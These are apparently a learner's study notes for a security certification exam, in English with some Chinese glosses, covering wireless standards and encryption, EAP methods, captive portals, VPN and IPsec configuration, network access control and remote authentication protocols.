what it takes to connect, it is allowed access to the network.
- Wireless networks can consist of a single access point or multiple ones, thus creating overlapping “cells” and allowing a user to roam freely without losing connectivity. important consideration when we get to generating wireless packets later in this chapter. The client needs to “associate” with an access point first and then “disassociate” when it moves to the next one. This dropping and reconnecting will prove vital later  When you have a single access point
- its “footprint” is called a basic service area (BSA).
- Communication between this single AP and its clients is known as a basic service set (BSS).
extend the range of network by adding multiple access points.
- You’ll need to make sure the channels are set right,
- and after they’re set up, you will have created an extended service set (ESS).
Roaming 漫游 : movement across multiple APs within a single ESS
- As a client moves from one AP in your subnet to another, so long ▪


## as you’ve configured everything correctly, the client will disassociate from one AP and (re)associate with another seamlessly.
BSSID: the MAC address of the wireless access point that is at the center of your BSS.
Antenna
Most WAPs have omnidirectional antennas.
Directional antenna: narrower beams and longer ranges.
 ▪


##  Yagi Antenna
commonly used in communications for frequency band of 10 MHz to VHF and UHF
omnidirectional (omni) antenna.
The most commonly used wireless antenna on both
APs and wireless devices
transmit and receive signals in all directions at the
   ▪


## same time.
  - Allows connect to an AP from any direction.
  - the signal emanates from the antenna in equal strength 360 degrees from the source.
- But if install in the corner of a building, three-quarters of your signal strength is lost to the parking lot hacker.
EXAM TIP
A spectrum analyzer can be used to verify wireless quality, detect rogue access points, and detect various attacks against your network.
directional antenna / Yagi antenna
transmits in a single direction and receives signals
back from the same direction.
Because focused in a single direction
  - greater gain than omni antenna
  - transmit / receive signals over greater distances.
  - greatly increases signal strength and distance.
  - has a very narrow radiation pattern, focusing the signal in a specific area.
Other antennas you can use are dipole and parabolic grid. 2,923

Dipole antennas: have two signal “towers” and work omnidirectionally.
Parabolic grid antennas
- one type of directional antenna
- They can have phenomenal range (up to 10 miles due to their power output) but aren’t in use much. Another directional antenna type is the
  loop antenna  Cantenna: kid with a Pringles can a block away tapping into your network. very real and can boost signals amazingly.
- work as a directional antenna.
 ▪


##  antenna placement
The point is, wireless network design needs to take into account not only the type of antenna used but where it is placed and what is set up to contain or corral the signal.
When considering antenna placement, you should also configure the antenna orientation.
Many APs have adjustable antennas. It depends.
Reception is maximized when your AP’s antenna
orientation matches the orientation used by your wireless devices.
However, you’ll find that antenna orientation isn’t consistent in all devices.
 ▪


##  Some place them horizontally and others place them
vertically. If your AP has two antennas, some experts recommend orienting one of them horizontally and one of them vertically.
Administrators often perform a site survey while planning and deploying a wireless network.
examines the wireless environment to identify potential
issues, such as areas with noise or other devices operating on the same frequency bands.
Administrators and security personnel periodically repeat the site survey to verify the environment hasn’t changed
and to detect potential security issues.
One method of performing a site survey is to configure an AP and position the antenna within the organization.
Administrators then measure the power levels of the
AP from different areas to determine if it provides the desired coverage.
If the AP doesn’t provide adequate coverage,
administrators might try to modify the placement of the AP and/ or its antenna, or add additional APs.
Antenna Power and Signal Strength
You cannot modify the gain of an antenna without changing its
   ▪


## physical propert.
But many wireless access points include a power setting that you can manipulate to increase or decrease the
transmit power.
Administrators sometimes reduce the power level to
restrict access to a small area (like conference room, prevent users from the parking lot or outside the building).
administrators sometimes increase the power level to increase the range of the AP.
    Omnidirectional and directional APs
The dotted circles using omnidirectional antennas.
AP 4 has a larger circle: power level is the highest in
this AP.
APs labeled A and B: using directional antennas.
Organizations sometimes use this configuration to connect networks between two buildings.
 Network Architecture Zones
- Wireless. Many organizations provide wireless networks for both employees
and guests.
  - Wireless networks for employees provide a bridge to a wired network, allowing employees access to all network resources just as if they were connected from a wired PC at their desk.
- Guest. A guest network is typically a wireless network used to provide guests with Internet access.
  - The guest network rarely gives guests access to network resources, but instead gives them a simple way to check their email or access web sites.
Wireless Cryptographic Protocols
Because wireless networks broadcast over the air, anyone who has a wireless transceiver can intercept the transmissions.
You can secure wireless networks with several different steps, but the most important step is to implement a strong security protocol.
Wireless authentication can happen in more than a few ways, from the simplistic to the complicated.
- client can simply send an 802.11 authentication frame with the appropriate SSID to an AP and have it answer with a verification frame.
- client might participate in a challenge/request scenario, with the AP verifying a decrypted “key” for authentication. Whether Open System Authentication Process or Shared Key Authentication Process, respectively.
- you may even tie the whole thing together with an authentication server (RADIUS), forcing the client into an even more complicated authentication scenario.
- Key, difference between association and authentication.
  - Association: the action of a client connecting to an AP,
  - Authentication: identifies the client before access anything on the network.
Wi-Fi Encryption
In the wireless realm, there are three commonly deployed security suites:
- WPA = IEEE 802.11i draft 3
  - = IEEE 802.1X/EAP + WEP( 选择性项目 )/TKIP
- WPA2 = IEEE 802.11i
  - = IEEE 802.1X/EAP + WEP( 选择性项目 )/TKIP/CCMP
WPS is not secure.
A WPS attack can discover the PIN within hours. then uses the PIN to discover the passphrase.
 wireless technologies should not be used due to their known vulnerabilities: WPS + WEP Wi-Fi protected setup (WPS):
Many wireless routers provide it for initial connection.
  - WPS uses a PIN to connect to the wireless access point.
  - This means: first connection, you only need the PIN to connect.
Convenient but dangerous.
  - The WPS attack: intercept that PIN in transmission, connect to the WAP, steal the WPA2 password.
  - 由Wi-Fi联盟(http://www.wi-fi.org/)组织实施的认证项目，简化 无线网络的安全加密设置。
  - 在传统方式下，用户新建一个无线网络时，必须在接入点手动设 置网络名(SSID)和安全密钥，然后在客户端验证密钥以阻止 “不速之客”的闯入。
  - Wi-Fi Protected Setup能帮助用户自动设置网络名(SSID)、配置 最高级别的WPA2安全密钥，具备这一功能的无线产品往往在机 身上设计有一个功能键，称为WPS按钮，用户只需轻轻按下该按 钮或输入PIN码，再经过两三步简单操作即可完成无线加密设 置，同时在客户端和路由器之间建立起一个安全的连接。
WEP encryption 有线等效加密
- Wired Equivalent Privacy/Wireless Encryption Protocol
   - Use administrator does not want to provide the wireless password or certificate to the employees
   - Deactivation of SSID broadcast: new devices can no longer find the wireless network by name but existing devices are still able to use the wireless network. ▪


## in effect, doesn’t effectively encrypt anything.
early security, but it fell short because of weaknesses in the way the encryption algorithms are employed.
- has been shown to have numerous weaknesses, primarily associated with the initiation of the RC4 cipher.
- there are three WEP “encryption” options.
  - The 64-bit version uses a 40-bit key,
  - the 128-bit version uses a 104 -bit key,
  - the 256-bit version uses a 232-bit key.
  - WEP was basically created without academic, cryptologic, or public review.
- exploit vulnerabilities of WEP: IV attack
WEP uses something called an initialization vector (IV), provides for
confidentiality and integrity.
- It calculates a 32-bit integrity check value (ICV) and appends it to the end of the data payload and then provides a 24-bit IV, which is combined with a key to be input into an RC4 algorithm.
- The “keystream” created by the algorithm is encrypted by an XOR operation and combined with the ICV to produce “encrypted” data.
- Although this all sounds well and good, it’s ridiculously easy to crack.
   - In 2007, rendered useless by capturing packets and discovering the passkey in a matter of seconds.
- This security flaw led to a network invasion of TJ Maxx and data theft through a technique known
as wardriving.
 WEP’s initialization vectors are relatively small and, for the most part, get reused pretty frequently. Additionally, they’re sent in clear text as part of the header. When you add this to the fact that we all know the cipher used (RC4) and that it wasn’t ever really designed for more than one-time usage, cracking becomes a matter of time and patience.
- An attacker simply needs to generate enough packets in order to analyze the IVs and come up with the key used.
- This allows him to decrypt the WEP shared key on the fly, in real time, and renders the encryption useless.
Does this mean WEP is entirely useless and should never be used? As far as your exam goes, that answer may as well be yes, but how about in the real world? Is a WEP-protected connection in a hotel better than the wired outlet provided to you in the room? That’s probably something you need to think about. You may prefer the protection the WEP connection gives you over the complete absence of anything on the wired connection. Not to mention, you don’t really know what’s on the other end of that port. The point is that while WEP shouldn’t be considered a secured network standard for your organization, and it will be roundly destroyed on the exam as being worthless, there are still plenty of uses for it, and it may turn out to be the best choice for specific situations in your adventures.
EXAM TIP
Attackers can get APs to generate bunches of packets
- by sending disassociate messages. These aren’t authenticated by any means, so the resulting barrage of “Please associate with me” packets is more than enough for the attack.
- Another option: use ARP to generate packets. WPA Wi-Fi Protected Access
- were designed to address the core problems with WEP, an interim
replacement for Wired Equivalent Privacy (WEP).
  - WEP has known vulnerabilities, should not be used.
  - WPA provided an immediate solution to the weaknesses of WEP without requiring users to upgrade their hardware.
- Even when WPA replaced WEP, its developers recognized that WPA wasn’t solid enough to last for an extended period.
- Instead, WPAimproved wireless security by giving users an alternative to WEP with existing hardware while the developers worked on creating the stronger WPA2 protocol.
WPA is susceptible to password-cracking attacks, especially when the AP has a weak passphrase.
- The attacker uses a wireless protocol analyzer to capture the authentication traffic
- and then uses an offline brute force attack to discover the passphrase.
- Attackers often use a disassociation attack to force the user to reauthenticate.
WPA makes use of Temporal Key Integrity Protocol (TKIP), a 128-bit key, and the client’s MAC address to accomplish much stronger
   - strengthen existing WEP without the replacement of legacy hardware. - ▪


## encryption.
- WPA changes the key out (hence the “temporal” part of the name) every 10,000 packets or so, instead of sticking with one and reusing it, as WEP does.
- Additionally, the keys are transferred back and forth during an Extensible Authentication Protocol (EAP) authentication session, which makes use of a four-step handshake process to prove the client belongs to the AP, and vice versa.
WPA2 is much the same process; however, it was designed with the government and the enterprise in mind.
WPA2 IEEE 802.11i
Permanent replacement for WPA.
stronger cryptography than WPA.
uses AES(symmetric) for confidentiality.
  - the most secure method to secure wireless.
  - WPA2 comes in two variants: PSK / Enterprise
128 bit and CCMP
The Wi-Fi Alliance requires all devices carrying its WI-FI
CERTIFIED logo to meet WPA2 standards, including the use of the Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP).
Although WPA2 provides significant security improvements,
       some enterprises need stronger security.
  - enable authentication with Enterprise mode WPA2 include encryption and integrity.
- Whether enterprise or personal, it uses AES encryption, ensuring FIPS 140-2 compliance—not to mention AES is just plain better.
- For integrity, TKIP had some irregularities originally. WPA2 addresses these by using something called Cipher Block Chaining Message Authentication Code Protocol (CCMP), simply uses something to show the message hasn’t been altered during transit.
  - we call hashes, CCMP calls them message integrity codes (MICs)
  - the whole thing is done through a process called cipher block chaining message authentication code (CBC-MAC).
 WEP is relatively easy to crack and according to your exam probably should never be used. However, on your home network you may be okay—especially if you take defense-in-depth measures to protect yourself.
WPA and WPA2 are much better choices from an overall security standpoint. - The answer to the question “how do you crack WPA2?” is, unfortunately, not very easily.
- In fact, if the password in use is long or overly complex, it’s improbable you can get it done in any reasonable timeframe at all since the key has absolutely nothing to do with the password. It’s not completely impossible; it’s just really tough with AES.
- The only real way to accomplish this is to use a tool that creates the crypto key based on the password (which you don’t have).
- You must capture the authentication handshake used in WPA2 and attempt to crack the pair master key (PMK) from inside (tools such as Aircrack and KicMAC, a Mac OS X tool, can help with this), but it’s just not that easy to do.
TKIP vs CCMP
- Temporal Key Integrity Protocol (TKIP)临时密钥完整性协议: older
encryption protocol used with WPA.
- CCMP: newer encryption protocol used with WPA2.
  - IEEE has deprecated WPAand TKIP due to various security issues, but many wireless networks are still using these older protocols.
  - IEEE recommends WPA2 with CCMP, provides more security.
- 为了兼容WEP，WPA定义了新的加密方式-TKIP:
  - WPA couples the RC4 encryption algorithm with TKIP :
  - 一种加密方法.   - 提供结合信息完整性检查和重新按键机制的信息包密钥.
  - TKIP mixes a root key with an initialization vector.
  - key mixing: there is effectively a new key for each packet.
  - benefit of TKIP: it didn’t require new hardware.
  - WEP users just upgrade software and/or firmware and implement WPA with TKIP, no need to replace the hardware.
  - Newer hardware supports WPA2, so the usage of WPA and TKIP is waning. However, you might still see some legacy hardware using WPAand TKIP.
- Later implementations of WPAsupport Advanced Encryption Standard (AES) instead of TKIP.
- Many applications beyond WPA/WPA2 use AES to provide secure encryption and ensure confidentiality.
- Several people have been successful at cracking WPA with TKIP, it’s best to upgrade WPA to WPA2, or upgrade TKIP to use AES.
WPA2 supports CCMP
- WPA2 favor Counter Mode with Cipher Block Chaining Message
Authentication Code Protocol (CCMP).
- CCMP is based on AES,
  - much stronger than WPA using TKIP.
- WPA2 also employs much more secure methods of managing the encryption
keys than WPA.
- WPA2就是WiFi联盟推出的第二代标准，提出具有更高安全性的加密标
准-CCMP，后向兼容TKIP.
  - AES-based encryption mode: CCMP uses 128-bit AES.
  - WPA2 fully implements the 802.11i Wi-Fi security standards.
    - WPA2-CCMP: the least susceptible to wireless replay
attacks ▪


## PSK, Enterprise, Open Modes
Wi-Fi Protected Access (WPA/WPA2) replace WEP.
Both WPA and WPA2 can operate in either pre-shared key (PSK) or Enterprise modes.
Personal / PSK mode (Pre-Shared Key): WPA/ WPA2-PSK
WPA2 offers a pre-shared key (PSK) option 预共用密钥模 式:
- simply set up a pre-shared key and give it only to those people you trust on your network.
shared key is previously shared between parties to establish
secure channel. the client and the wireless access point must negotiate and share a same key prior to initiating communications, using symmetric encryption; RC4.
When using PSK mode, users access the wireless network
anonymously with a PSK or passphrase.
  - This doesn’t provide individual authentication.
  - Authentication (username, password... )
  - passphrase without a username provides authorization, but without authentication.
     ▪


## 设计给负担不起 802.1X 验证server成本和复杂度: 家庭, 小型公司网络.
每一个使用者必须输入密语来取用网络，可以是8 到 63 个 ASCII 字符、或是 64 个16进位数字(256位元)。
密语可存可不存在电脑里以省去重复键入的麻烦，但密 语一定要存在 Wi-Fi 取用点里。
best solution for WPA2-PSK: use a long, random key (greater than 25 characters) and a long, random SSID, as the SSID is
used in pre-computed rainbow tables during an attack.
WPA-2 Enterprise mode
more secure than Personal mode
Enterprise mode forces users to authenticate with unique credentials before granting them access to the wireless network.
- tie EAP or a RADIUS server into the authentication side of WPA2, allowing you to make use of Kerberos tickets and all sorts of additional goodies.
much more complicated setup:
  - requires an 802.1x server,
  - Often uses an 802.1x authentication server implemented as a RADIUS authentication server, which accesses a database of accounts.
  - Also 802.1x server can provide certificate-based
  best for
 small network
 lacking an authentication server.
     ▪


## authentication to increase the security of the authentication process.
  - If users have wrong credentials, Enterprise mode (using an
802.1x server) blocks their access.
  - server handles distribution of cryptographic keys and/or digital certificates.
  - avoids the necessity to share a key in advance.
The authentication protocol determines if the 802.1x server
will use a certificate or not. (EAP ... EAP-TLS)
Suitable for large corporate networks
Hackers have cracked WPA2-PSK, but WPA2-Enterprise has not yet been cracked.
⁃
Open mode
If you select None in Security Options section, the AP will operate in Open mode, doesn’t have any security.
A third mode
sometimes called open, unsecure: sometimes for public Wi- Fi that has no access to any sensitive data, simply a portal to access the
Internet.
Example:
    Laptop with wireless signal on but no network: maybe the
laptop only supports WPA and WEP.
 ▪


## screenshot of a NETGEAR Orbi router web page.
The Wireless Network section: shows the SSID (Success) and selections for 2.4 GHz and 5 GHz channels.
  - Auto selection for 2.4 GHz: allows the AP to automatically select the best channel to use.
  - The 5 GHz Channel selection indicates the device will pick from 48 available channels in this band.
The Security Options section:
  - use WPA2-PSK with AES
  - the password (the passphrase or PSK) is IC@nP@ssSecurity+.
  - This device also supports the use of WPA for backward compatibility.
   ▪


##  If it did, it has check box to implement WPA2 Enterprise. When you select Enterprise mode, need to enter 3 info:
  - RADIUS Server: enter the IP assigned to the 802.1x server (often a RADIUS server or referred to as an AAA server)
  - RADIUS port: enter the port used by the RADIUS server. The official default port for RADIUS is 1812. However, some vendors have used other ports such as 1645. The key is that you must enter the same port here that the server is using.
Shared Secret: similar to a password, must enter it here exactly as it is entered on the RADIUS server.
After configuring WPA2 Enterprise on an AP, it redirects all attempts to connect to the RADIUS server to authenticate.
After users authenticate, the RADIUS server tells the AP to grant them access.
Wireless authentication systems using an 802.1x server are more advanced than most home networks need, but many larger organizations use them.
most home networks use Personal mode
Organizations want to increase wireless security by Enterprise mode.
A combination of both a security protocol such as WPA2 and
an 802.1x authentication server significantly reduces the chance of a successful access attack against a wireless system.
     Authentication Protocols
Wireless networks support different authentication protocols.
- Many are built on the Extensible Authentication Protocol (EAP), an authentication framework that provides general guidance for authentication methods.
- IEEE 802.1x servers: use one of these methods to increase the level of security during the authentication process.
- Additionally, while they are often used in wireless networks, they can also be used anywhere an 802.1x server is implemented.
A key point to remember for each methods: if they support or require certificates?
- EAP-FAST: supports digital certificates (optional)
- PEAP, EAP-TTLS: require a certificate on the server, but not the clients.
- EAP-TLS: requires certificates on both the servers and the clients.
Some methods are:
- EAP
  - provides a method for two systems to create a secure encryption key,
Extensible Authentication Protocol
also known as a Pairwise Master Key (PMK).
  - Systems then use this key to encrypt all data transmitted between the devices.
  - Both TKIP and AES-based CCMP use this key - LEAP ⁃
⁃
  - CCMP is much more secure.
Lightweight EAP
proprietary to Cisco
does not require a certificate
- EAP- FAST Flexible Authentication via Secure Tunneling .
  - Cisco designed it to secure replace Lightweight EAP (LEAP)
  - EAP- FAST supports certificates, but optionally.
- PEAP
Protected EAP
  - provides an extra layer of protection for EAP.
  - The EAP designers assumed that EAP would be used with adequate
physical security to ensure the communication channel was secure.
  - In practice, that wasn’t always the case, but PEAP protects the channel.
  - PEAP encapsulates and encrypts the EAP conversation in a Transport Layer Security (TLS) tunnel.
  - requires a certificate on the server, but not the clients.
  - often implemented with Microsoft Challenge Handshake
Authentication Protocol version 2 (MS-CHAPv2).
- EAP-TTLS Tunneled TLS
  - an extension of PEAP
  - allowing systems to use some older authentication methods such as Password Authentication Protocol (PAP) within a TLS tunnel.
  - requires a certificate on the 802.1x server but not the clients.
- EAP-TLS
  - most secure EAP standards
  - widely implemented.
  - The primary difference between PEAP and EAP-TLS:
  - it requires certificates on the 802.1x server and on each wireless clients.
- RADIUS Federation:   - federations used for single sign-on (SSO).
  - federation: includes entities (like companies) that share the
same identity management system.
  - Users can log on once and access shared resources with the other entity without logging on again.
  - it’s possible to create a federation using 802.1x and RADIUS servers.
Captive Portals
a technical solution that forces clients launch a web browsers to complete a specific process before it allows them access to the network.
  - This page must be navigated before access to network resources is granted.
Organizations commonly use it as a hot spot that requires users to log on or agree to specific terms before they can access the Internet.
  - Provide basic accountability: Pre-shared key, Enterprise, WPS not provide.
The web page: list acceptable use policies or require some authentication.
⁃
Here are three common examples:
Free Internet access: hospitals and other medical facilities provide free Internet access to patients and visitors. The captive portal requires users to acknowledge and agree to abide by an acceptable use policy (AUP). Free captive portals rarely require users to log on, but instead just require them to check a box indicating they agree, and then click a button to continue.
Paid Internet access. Many hotels, resorts, cruise ships, and airlines provide Internet access to customers, but on a pay-as-you-go basis. When users attempt to access the Internet, they are redirected to the captive portal and must successfully log on with a pre-created account or enter credit card information to pay for access.
 allowing administrators to block Internet access for
users until they perform required action. Alternative to IEEE 802.1x:
  - 802.1x server: expensive and not feasible option.
  - Organizations can use captive portals as an alternative.
  - It requires users to authenticate before granting them access.
Misconfigured Access Points
One of the primary reasons that wireless attacks are successful is because APs are misconfigured.
- Example:
- AP not using WPA2 with AES and CCMP, it is susceptible to many attacks.
- WPS enabled on an AP, a WPS attack can discover the PIN in a few hours simply by guessing. After it discovers the PIN, it can discover the passphrase.
VPNs for Remote Access
remote access: Secure Shell (SSH) Remote Desktop Protocol (RDP).
- virtual private network (VPN): another method for remote access.
VPNs allow users to access private networks via a public network. The public network is most commonly the Internet, but it can also be a semiprivate leased line from a telecommunications company. Because the telecommunications company will often lease access to one physical line to several companies, the leased line is not truly private.
Access over a public network is a core security concern with VPNs.
- Different tunneling protocols encapsulate and encrypt the traffic to protect the transferred through it.
VPNs and VPN Concentrators
It’s possible to create a VPN by enabling services on a server. - Example:
  - Windows server, you can enable the Direct Access VPN role and configure the Routing and Remote Access console.
- The only additional hardware requirement: the server has two network interface cards (NICs).
  - One NIC: accessible from the Internet
  - the second NIC: provides access to the private network.
  - If you are only supporting a few VPN clients, this might be the perfect solution.
Larger organizations often use a VPN concentrator, which is a dedicated device used for VPNs.
- VPN concentrator: includes all needed to create a VPN,
- including strong encryption and authentication techniques, supports many
clients.
- When using a VPN concentrator, typically place it in the DMZ.
  - The firewall between the Internet and the DMZ would forward VPN traffic to the VPN concentrator.
  - The concentrator would route all private VPN traffic to the firewall between the DMZ and the intranet.
Remote Access VPN  Connecting to a VPN server
- users connect to internal networks from remote locations.
- The VPN client first connects to the Internet using a broadband connection to
an Internet Service Provider (ISP).
- After connecting to the Internet, the VPN client can then initiate the VPN
connection.
- The VPN server is in the DMZ demilitarized zone and reachable through a public IP address.
  - This makes it accessible from any other host on the Internet. - A VPN server needs to authenticate clients.
  - A common method: internal Remote Authentication Dial-in User Service (RADIUS) server.
  - When a user logs on, the VPN server sends the user’s credentials to the RADIUS server.
  - the RADIUS server may have a database of users and passwords,
  - Commonly it to pass the credentials on to another server to validate them.
  - Example, the RADIUS server can pass the credentials on to a Lightweight Directory Access Protocol (LDAP) server during the authentication process.
  - In a Microsoft domain, the LDAP server is a domain controller. Site-to-Site VPNs
includes two VPN servers that act as gateways for two networks separated geographically.
can be on-demand VPNs or always-on VPNs.
Example:
organization have two locations. headquarters and remote office.
Itcan use two VPN servers to act as gateways to connect the networks at the two locations together  benefit: connects both networks without requiring additional steps on the part of the user.
Users in the remote office can connect to servers in the headquarters location as easily as if the servers were in the remote office.
Connecting to the remote server might be slower than connecting to a local server, but, otherwise, it’s transparent to end users.
in a traditional remote access VPN (host-to-gateway model), the end user makes the direct connection to the VPN server and is very much aware of the process.
Always-On VPN
can be used with both site-to-site VPNs and remote access VPNs. When used with a site-to-site VPN:
  - the two VPN gateways maintain the VPN connection.
  - some site-to-site VPNs use an on-demand connection.
  - VPN connection is only established when a user connects to a remote system.
Several vendors have always-on VPNs for remote access VPNs.
  - They attempt to create the VPN connection as soon as the user’s device
connects to the Internet.
  - Like right after turns on desktop PC or laptop always-on VPN anytime the device connects to an Internet connection.
  - Example:
  - user visits a coffee shop that has free Internet access and the user connects to the network, the device will automatically connect to the always-on VPN.
Mobile devices can also use always-on VPNs to protect traffic when users connect to public hot spots.
IPsec Internet Protocol security (IPsec):
- a common tunneling protocol used with VPNs.
- a method of encrypting data-in-transit.
- IPsec supports both Tunnel mode and Transport mode.
- Tunnel mode:
  - encrypts the entire IP packet used in the internal network, and is the mode used with VPNs transmitted over the Internet.
  - The benefit is that the IP addressing used within the internal network is encrypted and not visible to anyone who intercepts the traffic.
  - If someone does intercept the traffic, he can see the source IP address from the client and the destination address to the VPN server, but the internal IP address information remains hidden.
- Transport mode:
  - only encrypts the payload
  - provides the protection of an IP payload through an AH or ESP header.
  - commonly used in private networks, not with VPNs.
  - If traffic is transmitted and used only within a private network, no
need to hide the IP addresses by encrypting them. Encapsulating Security Payload (ESP) provides confidentiality, authentication, integrity, and anti-replay protection for the IP payload.
Authentication Header (AH) provides authentication, integrity, and anti- replay protection for the entire packet (IP header and the data payload in the packet). It does not provide confidentiality, does not encrypt the data.
IPsec provides security in two ways:
- Authentication: protocol number 51
  - IPsec includes Authentication Header (AH)
  - to allow each of the hosts in the IPsec conversation to authenticate
with each other before exchanging data.
  - AH provides authentication and integrity.
- Encryption. protocol number 50.
  - IPsec includes Encapsulating Security Payload (ESP)
  - to encrypt the data and provide confidentiality.
  - ESP includes AH so it provides confidentiality, authentication, and integrity.
  - Some VPNs use TLS to encrypt traffic within the VPN tunnel.
The term protocol number:
- AH and ESP are identified with protocol numbers, not port numbers.
- basic packet-filtering firewall can filter packets based on IP addresses, ports, and some protocols, such as Internet Control Message Protocol (ICMP) and IPsec.
- Packet filters use the protocol numbers to identify AH and ESP traffic.
- IPsec uses Internet Key Exchange (IKE) over port 500 to authenticate clients in the IPsec conversation.
- IKE creates security associations (SAs) for the VPN and uses these to set up a secure channel between the client and the VPN server. TLS as a Tunneling Protocol
Some tunneling protocols use Transport Layer Security (TLS) to secure the VPN channel.
Example:
Secure Socket Tunneling Protocol (SSTP) encrypts VPN traffic using TLS over port 443.
  - Using port 443 provides a lot of flexibility for many administrators and rarely requires opening additional firewall ports.
  - useful alternative when the VPN tunnel must go through a device using NAT, and IPsec is not feasible.
OpenVPN and OpenConnect: open source app that can use TLS to create a secure channel.
  - Also can use Secure Sockets Layer (SSL)
  - But SSL has weaknesses, TLS is the designated replacement.
Split Tunnel vs Full Tunnel
Imagine that Lisa connects to a company VPN server using IPsec from her home computer.
The VPN is using ESP so all traffic in the tunnel is encrypted.
Now, Lisa wants to do an Internet search on saxophones.
Will her computer connect directly to the Internet for her search?
Or will her computer make a connection through the VPN server first? It depends on how the VPN is configured.
In a split tunnel:
VPN administrator determines what traffic should use the encrypted tunnel.
only encrypts traffic destined for the VPN’s private network.
Example, it’s possible to configure the tunnel to only encrypt traffic going to private IP addresses used within the private network. Internet search with the VPN server configured in a split tunnel configuration, her Internet search traffic will not go through the encrypted tunnel. Instead, her
search will go directly to Internet sites via her ISP. In a full tunnel:
all traffic goes through the encrypted tunnel while the user is connected to the VPN.
If Lisa was connected to the VPN and then tried to connect to a public web site, the traffic would first go through the encrypted tunnel and then out to the public web site from within the private network.
If the private network routed Internet traffic through a unified threat management (UTM) device, Lisa’s traffic would go through the UTM device.
The web site would send web pages back to the UTM device and the VPN server would encrypt it and send it back to Lisa via the encrypted tunnel.
UTM device can perform URL filtering, malware inspection, and content inspection of all traffic sent through it.
◦ This is one of the reasons why an organization may choose to use a full tunnel for users connected to a VPN server.
◦ A disadvantage is that it can be slow.
◦ Not only is the Internet traffic is indirect route through the VPN server, but
it’s also being encrypted and decrypted many times. Network Access Control
Allowing remote access to your private network can expose your network to a significant number of risks from the clients.
- user logs on to a VPN with a malware-infected computer, this computer can then infect other computers on the internal network.
Network access control (NAC) methods:
- provide continuous security monitoring
- inspecting computers and preventing them from accessing the network if they don’t pass the inspection, redirect unhealthy clients to a remediation network.
Most administrators have complete control over computers in their network. (up-to-date antivirus software installed, current patches applied, firewalls enabled)
- However, administrators don’t have complete control of computers employees use at home or on the road.
NAC provides a measure of control for these other computers. - can use for VPN clients and for internal clients.
NAC can quarantine or isolate unhealthy clients that don’t meet the predefined NAC conditions.
- Restrict access of unhealthy clients to a remediation network.
- NAC systems use health: indicating that a client meets these predetermined
characteristics.
- It ensures that clients meet predetermined characteristics prior to accessing a
network.
Host Health Checks
Administrators set predefined conditions for healthy clients
- user meet these preset conditions can access the network.
- The NAC system isolates computers that don’t meet the conditions.
Common health conditions checked by a NAC are:
Up-to-date antivirus software, including updated signature definitions Up-to-date operating system, including current patches and fixes Firewall enabled on the client
NAC systems use authentication agents / health agents to inspect NAC clients.
- These agents are applications or services that check different conditions on the computer and document the status in a statement of health.
- When a client connects to a NAC-controlled network, the agent reports the health status of the NAC client.
Using network access control
NAC can inspect the health of VPN clients: When a VPN client accesses the network
- the VPN server queries the NAC health server to determine required health conditions. The VPN server also queries the client for a statement of the client’s health.
- If the client meets all health requirements, the NAC system allows the client to access the network.
- if a client doesn’t meet the health conditions mandated by the NAC server, the VPN server redirects the client to a remediation / quarantine network.
- The remediation network: includes resources the client can use to get healthy.
  - Example, it would include current approved patches, antivirus 2,957

software, and updated virus signatures.
  - The client can use these resources to improve its health and then try to access the network again.
NAC can also inspect the health of internal clients.
- Example, internal computers may occasionally miss patches and be
vulnerable.
- NACwill detect the unpatched system and quarantine it.
- If you use this feature, it’s important that the detection is accurate.
- A false positive by the NAC system can quarantine a healthy client, and prevent it from accessing the network.
Similarly, your organization may allow visitors or employees to plug in their mobile computers to live wall jacks for connectivity, or connect to a wireless network.
- NAC inspects the clients, and if they don’t meet health conditions, they may be granted Internet access through the network but remain isolated from any other network activity.
Permanent vsDissolvable 可解散的
Agents on clients can be either dissolvable or permanent.
- Permanent / persistent NAC agent:
  - is installed and stays on the client.
  - NAC uses the agent when the client attempts to log on remotely.
  - most common for corporate-owned devices, approved laptops that employees use to connect remotely.
- dissolvable NAC agent:   - is downloaded and run on the client when the client logs on remotely.
  - It collects the information it needs, identifies the client as healthy or not healthy, and reports the status back to the NAC system.
  - Some remove themselves after they report back to the NAC system.
  - or after the remote session ends.
  - often used for employee-owned mobile devices. Bring Your Own
Device (BYOD) policy.
  - Employee-owned devices are inspected for health, but the organization doesn’t require users to install extra software on their devices.
  - However, these dissolvable agents can detect vulnerabilities on mobile devices (like jail-broken / rooted device).
  - A jail-broken Apple device: removes software restrictions (like the ability to install software from sources beside Apple store)
  - A rooted Android device: has been modified, allowing root- level access to, and the ability to modify, the Android operating system.
- Many NAC vendors refer to dissolvable agents as an agentless capability, though this is somewhat of a misnomer. The NAC is still using an agent to inspect the client, but it is not installing the agent on the client.
Identity and Access Services implementing a VPN: to ensure only authorized entities can access it.
Remote access authentication: used when a user accesses a private network from a
remote location, such as with a VPN connection.
VPNs support multiple methods of authentication:
Password Authentication Protocol (PAP): sends passwords in cleartext, uesd only for last resort.
Challenge Handshake Authentication Protocol (CHAP).
  - uses a handshake process where the server challenges the client.
  - The client then responds with appropriate authentication information. Microsoft CHAP (MS-CHAP).
  - Microsoft implementation of CHAP, used only by Microsoft clients. MS-CHAPv2.
  - MS-CHAP is deprecated in favor of MS-CHAPv2.
  - several improvements: the ability to perform mutual authentication... Remote Authentication Dial-In User Service (RADIUS).
  - provides a centralized method of authentication for multiple remote access servers.
  - RADIUS encrypts the password packets, but not the entire authentication process.
Diameter.
  - created to overcome limitations of RADIUS often replace RADIUS.
  - uses TCP, encrypts the entire authentication process, and supports
many additional capabilities.
Terminal Access Controller Access-Control System Plus (TACACS+).
  - alternative to RADIUS, proprietary to Cisco systems.
  - A benefit:
  - can interact with Kerberos, allowing it to work with a broader range of environments, including Microsoft domains using Kerberos.
  - encrypts the entire authentication process, RADIUS encrypts only the password.
PAP, SPAP, and CHAP
These three authentication protocols: represent the evolution of authentication.
PAP Password Authentication Protocol
The oldest, primitive and unsecure method of authentication.
is used with Point-to-Point Protocol (PPP) to authenticate clients. Weakness: sends passwords in cleartext, security risk.
PPP was primarily used with dial-up connections.
  - there was a time when the thought of someone wiretapping a phone was rather remote. Because of this, security was an afterthought with PPP.
Today, PPP is only used as a last resort due to passwords being passed in cleartext, or it is used with another protocol that provides encryption.
PAP was used before packet sniffers became widely available. It is now insecure and should not be used.
SPAP Shiva Password Authentication Protocol simply encrypts the username and password.
   - Password
  - PIN number prevents a packet sniffer from getting the username and password, but cannot limit replay attacks or session hijacking.
CHAP Challenge Handshake Authentication Protocol a modern authentication protocol in use today.
is used with Point-to-Point Protocol (PPP) to authenticate remote clients.
more secure than PAP.
